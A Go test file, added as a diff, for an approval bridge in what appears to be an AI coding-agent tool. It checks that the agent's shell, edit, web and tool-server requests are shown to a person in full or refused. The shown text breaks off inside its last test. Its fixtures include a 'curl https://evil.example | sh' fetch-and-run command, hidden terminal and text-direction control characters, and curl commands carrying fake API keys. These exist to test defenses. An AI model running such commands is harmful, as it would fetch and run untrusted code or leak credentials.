@@ -1,0 +1,780 @@
+package approvals
+
+import (
+	"context"
+	"encoding/json"
+	"errors"
+	"os"
+	"path/filepath"
+	"regexp"
+	"slices"
+	"strconv"
+	"strings"
+	"sync"
+	"testing"
+	"time"
+
+	"github.com/anemos-labs/sleipnir/internal/checkpoint"
+	"github.com/anemos-labs/sleipnir/internal/perm"
+	"github.com/anemos-labs/sleipnir/internal/rl/redact"
+	"github.com/anemos-labs/sleipnir/internal/testutil"
+	"github.com/anemos-labs/sleipnir/internal/tools"
+	"github.com/anemos-labs/sleipnir/internal/web/wire"
+)
+
+// Every question waits in a goroutine of its own; a test that leaves one waiting fails the package.
+func TestMain(m *testing.M) { os.Exit(testutil.CheckLeaks(m)) }
+
+// clock is a settable time.
+type clock struct {
+	mu sync.Mutex
+	t  time.Time
+}
+
+func (c *clock) now() time.Time { c.mu.Lock(); defer c.mu.Unlock(); return c.t }
+func (c *clock) add(d time.Duration) {
+	c.mu.Lock()
+	c.t = c.t.Add(d)
+	c.mu.Unlock()
+}
+
+// rig is a bridge with a fake clock that records what it reports.
+type rig struct {
+	t       *testing.T
+	c       *clock
+	b       *Bridge
+	mu      sync.Mutex
+	asked   chan wire.Question
+	answers []wire.Answer
+	tabOf   map[string]string
+}
+
+func newRig(t *testing.T, cfg Config) *rig {
+	r := &rig{t: t, c: &clock{t: time.Unix(1_800_000_000, 0)}, asked: make(chan wire.Question, 256), tabOf: map[string]string{}}
+	cfg.Now = r.c.now
+	cfg.OnAsk = func(tab string, q wire.Question) {
+		r.mu.Lock()
+		r.tabOf[q.ID] = tab
+		r.mu.Unlock()
+		r.asked <- q
+	}
+	cfg.OnAnswer = func(tab string, a wire.Answer) {
+		r.mu.Lock()
+		r.answers = append(r.answers, a)
+		r.mu.Unlock()
+	}
+	r.b = New(cfg)
+	t.Cleanup(r.b.Close)
+	return r
+}
+
+// pending is a question being asked: its decision arrives on d.
+type pending struct {
+	q wire.Question
+	d chan perm.Decision
+}
+
+// ask puts a request to the tab's prompter in a goroutine and waits until the bridge has reported the question.
+func (r *rig) ask(ctx context.Context, tab string, req perm.Request) pending {
+	r.t.Helper()
+	p := r.b.Prompter(tab, "/proj", func(agent string) (string, string) {
+		if agent == "fe-1" {
+			return "T6", "web/**"
+		}
+		return "", ""
+	}, func() bool { return false })
+	d := make(chan perm.Decision, 1)
+	go func() { d <- p(ctx, req) }()
+	select {
+	case q := <-r.asked:
+		return pending{q: q, d: d}
+	case <-time.After(10 * time.Second):
+		r.t.Fatal("the question was not asked")
+		return pending{}
+	}
+}
+
+// decided waits for the decision of a pending question.
+func (p pending) decided(t *testing.T) perm.Decision {
+	t.Helper()
+	select {
+	case d := <-p.d:
+		return d
+	case <-time.After(10 * time.Second):
+		t.Fatal("the question was not decided")
+		return perm.Decision{}
+	}
+}
+
+func (r *rig) answersCopy() []wire.Answer {
+	r.mu.Lock()
+	defer r.mu.Unlock()
+	return append([]wire.Answer(nil), r.answers...)
+}
+
+// code is the wire code of an error, or "" for another error or none.
+func code(err error) string {
+	var we *wire.Error
+	if errors.As(err, &we) {
+		return we.Code
+	}
+	return ""
+}
+
+var bash = perm.Request{Agent: "fe-1", Tool: "bash", Command: "npm install --save-dev vitest", Cwd: "/proj/web",
+	Summary: "npm install --save-dev vitest [installs a package from the network]"}
+
+// bashRemember is bash with the rule the engine adds for "don't ask again".
+var bashRemember = func() perm.Request {
+	r := bash
+	r.RememberRules = []string{"Bash(npm install --save-dev vitest)"}
+	return r
+}()
+
+func TestQuestionIDs(t *testing.T) {
+	re := regexp.MustCompile(`^q_[a-z2-7]{26}$`)
+	seen := map[string]bool{}
+	for i := 0; i < 10000; i++ {
+		id, err := newID()
+		if err != nil {
+			t.Fatal(err)
+		}
+		if !re.MatchString(id) || seen[id] {
+			t.Fatalf("id %q: malformed or repeated", id)
+		}
+		seen[id] = true
+	}
+}
+
+// An answer before the floor is refused with how long to wait; at the floor it is taken; a second answer is refused; and the floor
+// starts again from the tab's last answer for the next question.
+func TestAnswerOnceAndFloor(t *testing.T) {
+	r := newRig(t, Config{})
+	p := r.ask(context.Background(), "shop", bash)
+	r.c.add(100 * time.Millisecond)
+	_, err := r.b.Answer(context.Background(), p.q.ID, wire.AnswerRequest{Choice: 1})
+	var we *wire.Error
+	if !errors.As(err, &we) || we.Code != "too_soon" || we.Status != 409 {
+		t.Fatalf("an answer at +100ms: %v", err)
+	}
+	if d, _ := we.Detail.(map[string]int64); d["retryAfterMs"] != 250 {
+		t.Errorf("retryAfterMs = %v, want 250", we.Detail)
+	}
+	r.c.add(260 * time.Millisecond)
+	res, err := r.b.Answer(context.Background(), p.q.ID, wire.AnswerRequest{Choice: 1})
+	if err != nil || !res.OK {
+		t.Fatalf("an answer at +360ms: %v %+v", err, res)
+	}
+	if d := p.decided(t); !d.Allow || d.Reason != "allowed by user" {
+		t.Errorf("decision %+v", d)
+	}
+	if _, err := r.b.Answer(context.Background(), p.q.ID, wire.AnswerRequest{Choice: 1}); code(err) != "answered" {
+		t.Errorf("a second answer: %v", err)
+	}
+	if _, err := r.b.Answer(context.Background(), "q_aaaaaaaaaaaaaaaaaaaaaaaaaa", wire.AnswerRequest{Choice: 1}); code(err) != "no_question" {
+		t.Errorf("an unknown id: %v", err)
+	}
+	// The next question of the tab was asked long ago, but the tab's answer was just now: the floor counts from that.
+	r.c.add(-10 * time.Second) // the question is created "before" the last answer
+	p2 := r.ask(context.Background(), "shop", bash)
+	r.c.add(10*time.Second + 100*time.Millisecond)
+	if _, err := r.b.Answer(context.Background(), p2.q.ID, wire.AnswerRequest{Choice: 1}); code(err) != "too_soon" {
+		t.Errorf("an answer 100ms after the tab's previous one: %v", err)
+	}
+	// Another tab's floor is its own.
+	p3 := r.ask(context.Background(), "docs", bash)
+	r.c.add(400 * time.Millisecond)
+	if _, err := r.b.Answer(context.Background(), p3.q.ID, wire.AnswerRequest{Choice: 3}); err != nil {
+		t.Errorf("another tab: %v", err)
+	}
+	if _, err := r.b.Answer(context.Background(), p2.q.ID, wire.AnswerRequest{Choice: 3}); err != nil {
+		t.Errorf("after the floor: %v", err)
+	}
+	p2.decided(t)
+	p3.decided(t)
+}
+
+// The answers mean what the terminal dialog's do; the page cannot choose a scope.
+func TestDecisionTable(t *testing.T) {
+	for _, tc := range []struct {
+		name   string
+		req    perm.Request
+		answer wire.AnswerRequest
+		want   perm.Decision
+		code   string
+	}{
+		{"yes", bash, wire.AnswerRequest{Choice: 1}, perm.Decision{Allow: true, Reason: "allowed by user"}, ""},
+		{"yes for the session", bashRemember, wire.AnswerRequest{Choice: 2}, perm.Decision{Allow: true, Reason: "allowed by user for the session", Remember: perm.ScopeSession}, ""},
+		{"nothing to remember", bash, wire.AnswerRequest{Choice: 2}, perm.Decision{}, "bad_choice"},
+		{"no", bash, wire.AnswerRequest{Choice: 3}, perm.Decision{Reason: "denied by user"}, ""},
+		{"no with a note", bash, wire.AnswerRequest{Choice: 3, Note: "use the existing test runner"}, perm.Decision{Reason: perm.DeclinedWith("use the existing test runner")}, ""},
+		{"tool server for the project", perm.Request{Tool: perm.ToolMCPServer, Summary: "start x"}, wire.AnswerRequest{Choice: 2}, perm.Decision{Allow: true, Reason: "approved by user for this project", Remember: perm.ScopeProject}, ""},
+		{"project files until they change", perm.Request{Tool: perm.ToolProjectTrust, Summary: "use them?"}, wire.AnswerRequest{Choice: 2}, perm.Decision{Allow: true, Reason: "trusted by user until the files change", Remember: perm.ScopeProject}, ""},
+		{"the tests preset", perm.Request{Agent: "be-1", Tool: "bash", Command: "go test ./...", OffersTests: true}, wire.AnswerRequest{Choice: 4}, perm.Decision{Allow: true, Reason: "builds and tests allowed by user for the session", Remember: perm.ScopeSession, Preset: perm.PresetTests}, ""},
+		{"the tests preset not offered", bash, wire.AnswerRequest{Choice: 4}, perm.Decision{}, "bad_choice"},
+		{"no such choice", bash, wire.AnswerRequest{Choice: 5}, perm.Decision{}, "bad_choice"},
+		{"a note with a yes", bash, wire.AnswerRequest{Choice: 1, Note: "x"}, perm.Decision{}, "bad_choice"},
+		{"a note too long", bash, wire.AnswerRequest{Choice: 3, Note: strings.Repeat("é", MaxNote+1)}, perm.Decision{}, "bad_choice"},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			r := newRig(t, Config{})
+			ctx, cancel := context.WithCancel(context.Background())
+			defer cancel()
+			p := r.ask(ctx, "shop", tc.req)
+			r.c.add(time.Second)
+			_, err := r.b.Answer(context.Background(), p.q.ID, tc.answer)
+			if tc.code != "" {
+				if code(err) != tc.code {
+					t.Fatalf("error %v, want %s", err, tc.code)
+				}
+				cancel()
+				p.decided(t)
+				return
+			}
+			if err != nil {
+				t.Fatal(err)
+			}
+			if got := p.decided(t); got != tc.want {
+				t.Errorf("decision %+v, want %+v", got, tc.want)
+			}
+		})
+	}
+}
+
+// An interrupt refuses the questions of the agent the person talks to and keeps the workers'.
+func TestInterruptRefusesMainQuestionsOnly(t *testing.T) {
+	r := newRig(t, Config{})
+	main := r.ask(context.Background(), "shop", perm.Request{Agent: "mgr", Tool: "bash", Command: "rm -rf build"})
+	worker := r.ask(context.Background(), "shop", bash)
+	other := r.ask(context.Background(), "docs", perm.Request{Agent: "mgr", Tool: "bash", Command: "make docs"})
+	r.b.CancelAgent("shop", "mgr", ByCanceled)
+	if d := main.decided(t); d.Allow || d.Reason != "no answer" {
+		t.Errorf("the manager's question: %+v", d)
+	}
+	open := r.b.Open()
+	if len(open) != 2 || open[0].Q.ID != worker.q.ID || open[1].Q.ID != other.q.ID {
+		t.Fatalf("open after the interrupt: %+v", open)
+	}
+	a := r.answersCopy()
+	if len(a) != 1 || a[0].QID != main.q.ID || a[0].By != ByCanceled || a[0].Choice != 3 {
+		t.Errorf("answers %+v", a)
+	}
+	r.b.CancelTab("shop", ByClosed)
+	worker.decided(t)
+	if open := r.b.OpenFor("docs"); len(open) != 1 {
+		t.Errorf("closing one tab touched another: %+v", open)
+	}
+	r.b.CancelTab("docs", ByClosed)
+	other.decided(t)
+}
+
+// With no page connected for the grace period, the open questions are refused by "nobody"; a page that connects in time stops the clock.
+func TestGraceRefusal(t *testing.T) {
+	r := newRig(t, Config{Grace: time.Minute})
+	p := r.ask(context.Background(), "shop", bash)
+	r.b.Connected(1, r.c.now())
+	r.c.add(2 * time.Minute)
+	r.b.Connected(1, r.c.now())
+	if len(r.b.Open()) != 1 {
+		t.Fatal("refused while a page was connected")
+	}
+	r.b.Connected(0, r.c.now())
+	r.c.add(59 * time.Second)
+	r.b.Connected(0, r.c.now())
+	if len(r.b.Open()) != 1 {
+		t.Fatal("refused before the grace passed")
+	}
+	r.c.add(time.Second)
+	r.b.Connected(0, r.c.now())
+	if d := p.decided(t); d.Allow {
+		t.Errorf("decision %+v", d)
+	}
+	if a := r.answersCopy(); len(a) != 1 || a[0].By != ByNobody {
+		t.Errorf("answers %+v", a)
+	}
+}
+
+// While the session starts, the questions about the project's files and its tool servers are refused without being asked.
+func TestStartRefusesTrustAndMCPQuestions(t *testing.T) {
+	r := newRig(t, Config{})
+	starting := true
+	p := r.b.Prompter("shop", "/proj", nil, func() bool { return starting })
+	for _, tool := range []string{perm.ToolProjectTrust, perm.ToolMCPServer} {
+		if d := p(context.Background(), perm.Request{Tool: tool, Summary: "?"}); d.Allow {
+			t.Errorf("%s while starting: %+v", tool, d)
+		}
+	}
+	select {
+	case q := <-r.asked:
+		t.Errorf("a question was asked while starting: %+v", q)
+	default:
+	}
+	starting = false
+	q := r.ask(context.Background(), "shop", perm.Request{Tool: perm.ToolMCPServer, Summary: "start the MCP server x"})
+	if q.q.Kind != "mcp" || q.q.Agent != "mgr" {
+		t.Errorf("a later tool server question: %+v", q.q)
+	}
+	r.b.CancelTab("shop", ByClosed)
+	q.decided(t)
+}
+
+// A question whose context ends is refused and reported: by "timeout" for the ask timeout, by "canceled" for an interrupt.
+func TestTimeoutAndCancelAreReported(t *testing.T) {
+	r := newRig(t, Config{})
+	ctx, cancel := context.WithTimeout(context.Background(), 50*time.Millisecond)
+	defer cancel()
+	p := r.ask(ctx, "shop", bash)
+	if d := p.decided(t); d.Allow || d.Reason != "no answer" {
+		t.Errorf("after the timeout: %+v", d)
+	}
+	ctx2, cancel2 := context.WithCancel(context.Background())
+	p2 := r.ask(ctx2, "shop", bash)
+	cancel2()
+	p2.decided(t)
+	a := r.answersCopy()
+	if len(a) != 2 || a[0].By != ByTimeout || a[1].By != ByCanceled {
+		t.Errorf("answers %+v", a)
+	}
+	if len(r.b.Open()) != 0 {
+		t.Error("a question is still open")
+	}
+}
+
+// What the page is shown hides nothing: terminal controls and characters that reorder text are shown as escapes, never removed;
+// the directory is relative to the project, the engine's reason is the why, the agent's lease is the scope, and every rule that a
+// "don't ask again" would add is named.
+func TestQuestionsShowEverythingThatWillRun(t *testing.T) {
+	r := newRig(t, Config{})
+	p := r.ask(context.Background(), "shop", perm.Request{Agent: "fe-1", Tool: "bash", Cwd: "/proj/web",
+		Command: "echo hi \x1b]0;x\x07; echo \u202eevil", Summary: "echo … [reaches the network]", RememberRules: []string{"Bash(echo:*)", "Bash(rm:*)"}})
+	q := p.q
+	if q.Cmd != `echo hi \x1b]0;x\x07; echo \u202eevil` {
+		t.Errorf("cmd %q: a control was hidden", q.Cmd)
+	}
+	if q.Cwd != "web/" || q.Why != "reaches the network" || q.Task != "T6" || q.Scope != "cwd web/ (inside fe-1's lease web/**)" || q.Kind != "command" ||
+		q.What != "this command" || q.Rule != "Bash(echo:*), Bash(rm:*)" {
+		t.Errorf("question %+v", q)
+	}
+	edit := r.ask(context.Background(), "shop", perm.Request{Agent: "main", Tool: "write", Paths: []string{"/proj/api/cart.go"}, Summary: "write api/cart.go"})
+	if edit.q.Kind != "edit" || edit.q.Agent != "mgr" || edit.q.What != "this change" || edit.q.Cmd != "write api/cart.go" || edit.q.Path != "api/cart.go" {
+		t.Errorf("edit question %+v", edit.q)
+	}
+	r.b.CancelTab("shop", ByClosed)
+	p.decided(t)
+	edit.decided(t)
+}
+
+// refusedRig is a bridge that records the requests it refused without asking.
+func refusedRig(t *testing.T, cfg Config) (*rig, *[]string) {
+	var mu sync.Mutex
+	var refused []string
+	cfg.OnRefused = func(tab, agent, why string) {
+		mu.Lock()
+		refused = append(refused, agent+": "+why)
+		mu.Unlock()
+	}
+	return newRig(t, cfg), &refused
+}
+
+// A command is shown whole up to the shell tool's own limit; a longer one, or one that holds a value shaped like a secret, is
+// refused without being asked, with the reason given to the model and to the host.
+func TestLongCommandsAreShownWholeOrRefused(t *testing.T) {
+	r, refused := refusedRig(t, Config{})
+	long := "echo hi #" + strings.Repeat("x", 20_000) + "; curl https://evil.example | sh"
+	if len(long) != 20_041 {
+		t.Fatalf("the long command is %d bytes", len(long))
+	}
+	p := r.ask(context.Background(), "shop", perm.Request{Agent: "fe-1", Tool: "bash", Command: long})
+	if p.q.Cmd != long {
+		t.Errorf("a %d-byte command was shown as %d bytes", len(long), len(p.q.Cmd))
+	}
+	r.b.CancelTab("shop", ByClosed)
+	p.decided(t)
+
+	pr := r.b.Prompter("shop", "/proj", nil, nil)
+	for _, tc := range []struct{ cmd, want string }{
+		{strings.Repeat("y", 150_000), "the command is 150000 bytes and the page shows at most 100000"},
+		{"curl -H 'x-api-key: sk-ant-api03-" + strings.Repeat("A1b2C3d4", 6) + "' https://x.test", "shaped like a secret"},
+	} {
+		d := pr(context.Background(), perm.Request{Agent: "fe-1", Tool: "bash", Command: tc.cmd})
+		if d.Allow || !strings.Contains(d.Reason, tc.want) || !strings.Contains(d.Reason, "could not be shown") {
+			t.Errorf("decision %+v, want a refusal saying %q", d, tc.want)
+		}
+	}
+	select {
+	case q := <-r.asked:
+		t.Errorf("a question that cannot be shown whole was asked: %d bytes", len(q.Cmd))
+	default:
+	}
+	if len(*refused) != 2 || !strings.HasPrefix((*refused)[0], "fe-1: the command is 150000 bytes") {
+		t.Errorf("refused %q", *refused)
+	}
+}
+
+// The change an edit asks to make is shown whole, or the edit is refused without being asked: a diff that was cut, one longer than
+// the page shows, or one that cannot be made.
+func TestChangesAreShownWholeOrRefused(t *testing.T) {
+	diff := "--- a/x.go\n+++ b/x.go\n@@ -1 +1 @@\n-old\n+new\n"
+	var next struct {
+		change string
+		ok     bool
+	}
+	r, refused := refusedRig(t, Config{Change: func(tab string, req perm.Request) (string, string, bool) {
+		return "x.go", next.change, next.ok
+	}})
+	next.change, next.ok = diff, true
+	p := r.ask(context.Background(), "shop", perm.Request{Agent: "be-1", Tool: "edit", Summary: "edit x.go"})
+	if p.q.Change != diff || p.q.Path != "x.go" {
+		t.Errorf("change %q path %q", p.q.Change, p.q.Path)
+	}
+	r.b.CancelTab("shop", ByClosed)
+	p.decided(t)
+	pr := r.b.Prompter("shop", "/proj", nil, nil)
+	for _, tc := range []struct {
+		change string
+		ok     bool
+	}{
+		{"--- a/x.go\n+++ b/x.go\n" + checkpoint.UnshownPrefix + "it is not text]\n", true},
+		{diff + "[diff truncated]\n", true},
+		{"+" + strings.Repeat("z", MaxChange) + "\n", true},
+		{"", false},
+	} {
+		next.change, next.ok = tc.change, tc.ok
+		if d := pr(context.Background(), perm.Request{Agent: "be-1", Tool: "edit", Summary: "edit x.go"}); d.Allow || !strings.Contains(d.Reason, "could not be shown") {
+			t.Errorf("a change of %d bytes (ok %v): %+v", len(tc.change), tc.ok, d)
+		}
+	}
+	if len(*refused) != 4 {
+		t.Errorf("refused %q", *refused)
+	}
+}
+
+// The command limit of a question is the shell tool's own: a command that the tool runs is never too long to be shown.
+func TestTheCommandLimitIsTheShellTools(t *testing.T) {
+	src, err := os.ReadFile(filepath.Join("..", "..", "tools", "shell", "bash.go"))
+	if err != nil {
+		t.Fatal(err)
+	}
+	m := regexp.MustCompile(`(?m)^const maxCommandBytes = ([0-9_]+)$`).FindSubmatch(src)
+	if m == nil {
+		t.Fatal("internal/tools/shell/bash.go no longer declares maxCommandBytes: keep MaxCommand equal to the tool's limit")
+	}
+	if got := strings.ReplaceAll(string(m[1]), "_", ""); got != strconv.Itoa(MaxCommand) {
+		t.Errorf("the shell tool runs commands of up to %s bytes; a question shows %d", got, MaxCommand)
+	}
+}
+
+// A tab with more open questions than its bound makes the next one wait to be asked; none is dropped.
+func TestQuestionsBeyondTheBoundWaitAndAreNotDropped(t *testing.T) {
+	r := newRig(t, Config{MaxPerTab: 1})
+	first := r.ask(context.Background(), "shop", bash)
+	p := r.b.Prompter("shop", "/proj", nil, nil)
+	d := make(chan perm.Decision, 1)
+	go func() {
+		d <- p(context.Background(), perm.Request{Agent: "be-1", Tool: "bash", Command: "make", RememberRules: []string{"Bash(make)"}})
+	}()
+	select {
+	case q := <-r.asked:
+		t.Fatalf("a second question was asked over the bound: %+v", q)
+	case <-time.After(100 * time.Millisecond):
+	}
+	r.c.add(time.Second)
+	if _, err := r.b.Answer(context.Background(), first.q.ID, wire.AnswerRequest{Choice: 1}); err != nil {
+		t.Fatal(err)
+	}
+	first.decided(t)
+	var second wire.Question
+	select {
+	case second = <-r.asked:
+	case <-time.After(10 * time.Second):
+		t.Fatal("the waiting question was dropped")
+	}
+	r.c.add(time.Second)
+	if _, err := r.b.Answer(context.Background(), second.ID, wire.AnswerRequest{Choice: 2}); err != nil {
+		t.Fatal(err)
+	}
+	if got := <-d; !got.Allow || got.Remember != perm.ScopeSession {
+		t.Errorf("decision %+v", got)
+	}
+}
+
+// Closing the bridge refuses what is open and everything asked afterwards.
+func TestCloseRefusesEverything(t *testing.T) {
+	r := newRig(t, Config{})
+	p := r.ask(context.Background(), "shop", bash)
+	r.b.Close()
+	if d := p.decided(t); d.Allow {
+		t.Errorf("%+v", d)
+	}
+	pr := r.b.Prompter("shop", "/proj", nil, nil)
+	if d := pr(context.Background(), bash); d.Allow {
+		t.Errorf("after close: %+v", d)
+	}
+	if a := r.answersCopy(); len(a) != 1 || a[0].By != ByClosed {
+		t.Errorf("answers %+v", a)
+	}
+}
+
+// A web fetch or search is shown with the whole URL or query of the call, not the tool's one-line summary (a path or a query can
+// carry data to a host that is allowed); one too long to be shown is refused.
+func TestWebRequestsAreShownWithTheirWholeInput(t *testing.T) {
+	r, refused := refusedRig(t, Config{})
+	url := "https://docs.example.com/a?q=" + strings.Repeat("d", 400)
+	in, _ := json.Marshal(map[string]any{"url": url})
+	p := r.ask(context.Background(), "shop", perm.Request{Agent: "be-1", Tool: "web_fetch", Input: in, Summary: "fetch " + url[:300] + "…", Network: true})
+	if p.q.Cmd != "fetch "+url || p.q.Kind != "web" {
+		t.Errorf("the fetch shown: %d bytes %q", len(p.q.Cmd), p.q.Cmd[:min(60, len(p.q.Cmd))])
+	}
+	query := strings.Repeat("why ", 60)
+	qin, _ := json.Marshal(map[string]any{"query": query})
+	q := r.ask(context.Background(), "shop", perm.Request{Agent: "be-1", Tool: "web_search", Input: qin, Summary: "search the web for \"why why…\"", Network: true})
+	if q.q.Cmd != "search the web for "+strconv.Quote(query) {
+		t.Errorf("the search shown: %q", q.q.Cmd)
+	}
+	r.b.CancelTab("shop", ByClosed)
+	p.decided(t)
+	q.decided(t)
+	long, _ := json.Marshal(map[string]any{"url": "https://docs.example.com/" + strings.Repeat("x", 20_000)})
+	if d := r.b.Prompter("shop", "/proj", nil, nil)(context.Background(), perm.Request{Agent: "be-1", Tool: "web_fetch", Input: long, Summary: "fetch …"}); d.Allow || len(*refused) != 1 {
+		t.Errorf("a fetch too long to show: %+v, refused %q", d, *refused)
+	}
+}
+
+// Answer 2 is offered only when the permission engine will remember a rule for it, and the question shows exactly the rules it adds:
+// a command with a glob, or one asked because of an ask rule, remembers nothing, so it shows no rule and takes no answer 2.
+func TestRememberIsOfferedOnlyWhenTheEngineStoresARule(t *testing.T) {
+	dir := t.TempDir()
+	r := newRig(t, Config{})
+	e, err := perm.NewEngine(perm.Config{Root: dir, Home: t.TempDir(), Ask: []string{"Bash(git push:*)"}, Prompter: r.b.Prompter("shop", dir, nil, nil)})
+	if err != nil {
+		t.Fatal(err)
+	}
+	for _, tc := range []struct {
+		name, cmd string
+		remembers bool
+	}{
+		{"a glob", "rm build/*.tmp", false},
+		{"an ask rule", "git push origin main", false},
+		{"one command", "rm build/out.tmp", true},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			d := make(chan perm.Decision, 1)
+			go func() {
+				d <- e.Check(context.Background(), perm.Request{Agent: "be-1", Tool: "bash", Command: tc.cmd, Cwd: dir, Writes: true, Summary: tc.cmd})
+			}()
+			var q wire.Question
+			select {
+			case q = <-r.asked:
+			case <-time.After(10 * time.Second):
+				t.Fatal("not asked")
+			}
+			before := e.Rules(perm.Allow)
+			r.c.add(time.Second)
+			if !tc.remembers {
+				if q.Rule != "" || OffersRemember(q) {
+					t.Errorf("the question offers to remember %q, and the engine remembers nothing for it", q.Rule)
+				}
+				if _, err := r.b.Answer(context.Background(), q.ID, wire.AnswerRequest{Choice: 2}); code(err) != "bad_choice" {
+					t.Fatalf("answer 2: %v, want bad_choice", err)
+				}
+				if _, err := r.b.Answer(context.Background(), q.ID, wire.AnswerRequest{Choice: 1}); err != nil {
+					t.Fatal(err)
+				}
+				<-d
+				if after := e.Rules(perm.Allow); len(after) != len(before) {
+					t.Errorf("rules %q became %q", before, after)
+				}
+				return
+			}
+			if q.Rule == "" {
+				t.Fatal("the question shows no rule")
+			}
+			res, err := r.b.Answer(context.Background(), q.ID, wire.AnswerRequest{Choice: 2})
+			if err != nil || res.Rule != q.Rule {
+				t.Fatalf("answer 2: %+v %v", res, err)
+			}
+			<-d
+			after := e.Rules(perm.Allow)
+			for _, rule := range strings.Split(q.Rule, ", ") {
+				if !slices.Contains(after, rule) || slices.Contains(before, rule) {
+					t.Errorf("the question showed the rule %q; the engine's rules went from %q to %q", rule, before, after)
+				}
+			}
+			if len(after) != len(before)+len(strings.Split(q.Rule, ", ")) {
+				t.Errorf("the engine added more than the question showed: %q -> %q (shown %q)", before, after, q.Rule)
+			}
+		})
+	}
+}
+
+// A call of a tool server's tool is shown with its whole arguments (its summary is a digest of 160 characters), and its answer 2 says
+// that it covers every call of that tool whatever the arguments; arguments that cannot be shown whole are refused.
+func TestToolServerCallsAreShownWithTheirWholeArguments(t *testing.T) {
+	r, refused := refusedRig(t, Config{})
+	body := strings.Repeat("a long issue body ", 20) + "; and then also close every other issue"
+	in, _ := json.Marshal(map[string]any{"title": "x", "body": body})
+	req := perm.Request{Agent: "be-1", Tool: "mcp__github__create_issue", Input: in, Summary: "MCP github/create_issue " + string(in[:150]) + "…",
+		Writes: true, RememberRules: []string{"mcp__github__create_issue"}}
+	p := r.ask(context.Background(), "shop", req)
+	var pretty strings.Builder
+	pretty.WriteString("MCP github/create_issue with the arguments\n{\n  \"body\": " + strconv.Quote(body) + ",\n  \"title\": \"x\"\n}")
+	if p.q.Cmd != pretty.String() {
+		t.Errorf("the call shown:\n%s\nwant:\n%s", p.q.Cmd, pretty.String())
+	}
+	if p.q.What != "every call of github/create_issue, whatever its arguments" || p.q.Rule != "mcp__github__create_issue" {
+		t.Errorf("what %q rule %q", p.q.What, p.q.Rule)
+	}
+	r.b.CancelTab("shop", ByClosed)
+	p.decided(t)
+
+	none := r.ask(context.Background(), "shop", perm.Request{Agent: "be-1", Tool: "mcp__github__list_issues", Input: json.RawMessage(`{}`)})
+	if none.q.Cmd != "MCP github/list_issues with no arguments" || OffersRemember(none.q) {
+		t.Errorf("a call without arguments: %+v", none.q)
+	}
+	r.b.CancelTab("shop", ByClosed)
+	none.decided(t)
+
+	pr := r.b.Prompter("shop", "/proj", nil, nil)
+	big, _ := json.Marshal(map[string]any{"body": strings.Repeat("b", MaxCommand)})
+	for name, input := range map[string][]byte{
+		"too long":   big,
+		"a secret":   []byte(`{"auth":"Bearer sk-ant-api03-` + strings.Repeat("A1b2C3d4", 6) + `"}`),
+		"unreadable": []byte(`{"body":`),
+	} {
+		if d := pr(context.Background(), perm.Request{Agent: "be-1", Tool: "mcp__github__create_issue", Input: input}); d.Allow || !strings.Contains(d.Reason, "could not be shown") {
+			t.Errorf("%s: %+v", name, d)
+		}
+	}
+	if len(*refused) != 3 {
+		t.Errorf("refused %q", *refused)
+	}
+}
+
+// Every rune that would not show as itself is written as an escape, never removed: the page shows nothing that the translator's
+// sanitizer (tools.SanitizeForTerminal) would alter, and nothing that renders as nothing.
+func TestVisibleEscapesEveryHiddenRune(t *testing.T) {
+	var named []rune
+	for _, rg := range [][2]rune{{0xfe00, 0xfe0f}, {0xe0100, 0xe01ef}, {0x180b, 0x180f}, {0xe0000, 0xe007f}, {0x200b, 0x200f}, {0x202a, 0x202e},
+		{0x2060, 0x206f}} {
+		for r := rg[0]; r <= rg[1]; r++ {
+			named = append(named, r)
+		}
+	}
+	named = append(named, 0x115f, 0x1160, 0x3164, 0xffa0, 0x2800, 0x00ad, 0x034f, 0xfeff, 0x2028, 0x2029, 0x1b, 0x7f, 0x85, 0x9b)
+	for _, r := range named {
+		if v := visible("a" + string(r) + "b"); strings.ContainsRune(v, r) || !strings.HasPrefix(v, `a\`) {
+			t.Errorf("U+%04X is shown as %q", r, v)
+		}
+	}
+	if got := visible("\U000e0100x\u2800\xff"); got != `\U000e0100x\u2800\xff` {
+		t.Errorf("escapes %q", got)
+	}
+	for r := rune(0); r <= 0x10ffff; r++ {
+		if r >= 0xd800 && r <= 0xdfff {
+			continue
+		}
+		s := string(r)
+		v := visible(s)
+		if tools.SanitizeForTerminal(v) != v {
+			t.Fatalf("U+%04X is shown as %q, which the sanitizer alters", r, v)
+		}
+		if v != s && !strings.HasPrefix(v, `\`) {
+			t.Fatalf("U+%04X is shown as %q", r, v)
+		}
+	}
+}
+
+// A value that the translator's redactor would mask is refused, not shown: one that only the entropy rule finds, and one that a
+// character that hides splits in two.
+func TestSecretsAreRefusedWhereverThePageWouldMaskThem(t *testing.T) {
+	r, refused := refusedRig(t, Config{})
+	pr := r.b.Prompter("shop", "/proj", nil, nil)
+	for _, cmd := range []string{
+		"echo apiKey Zx81kQ2mP9vL4wR7tY3uB6nE0cH5jD",
+		"curl -H 'x-api-key: sk-ant-api03-\u200b" + strings.Repeat("A1b2C3d4", 6) + "' https://x.test",
+	} {
+		if d := pr(context.Background(), perm.Request{Agent: "be-1", Tool: "bash", Command: cmd}); d.Allow || !strings.Contains(d.Reason, "shaped like a secret") {
+			t.Errorf("%q: %+v", cmd, d)
+		}
+	}
+	if len(*refused) != 2 {
+		t.Errorf("refused %q", *refused)
+	}
+	masker := redact.New(redact.Config{Salt: SecretSalt, Kinds: SecretKinds()})
+	if _, changed := masker.Changed("echo apiKey Zx81kQ2mP9vL4wR7tY3uB6nE0cH5jD"); !changed {
+		t.Error("the page's redactor no longer masks the entropy example: pick another")
+	}
+}
+
+// A question too large to be sent on the page's stream once encoded is refused without being asked (a change of 200 KB of "<" is
+// 1.2 MB of JSON), and a question whose event could not be sent is refused when the host says so.
+func TestQuestionsThatCannotBeSentAreRefused(t *testing.T) {
+	change := "--- /dev/null\n+++ b/x.html\n@@ -0,0 +1 @@\n+" + strings.Repeat("<", 200_000) + "\n"
+	r, refused := refusedRig(t, Config{Change: func(string, perm.Request) (string, string, bool) { return "x.html", change, true }})
+	pr := r.b.Prompter("shop", "/proj", nil, nil)
+	if d := pr(context.Background(), perm.Request{Agent: "be-1", Tool: "write", Summary: "write x.html"}); d.Allow || !strings.Contains(d.Reason, "once encoded for the page") {
+		t.Errorf("an oversize question: %+v", d)
+	}
+	p := r.ask(context.Background(), "shop", bash)
+	if !r.b.Refuse(p.q.ID, "its event could not be sent: too large") {
+		t.Fatal("Refuse did not end the question")
+	}
+	if d := p.decided(t); d.Allow || !strings.Contains(d.Reason, "its event could not be sent") {
+		t.Errorf("decision %+v", d)
+	}
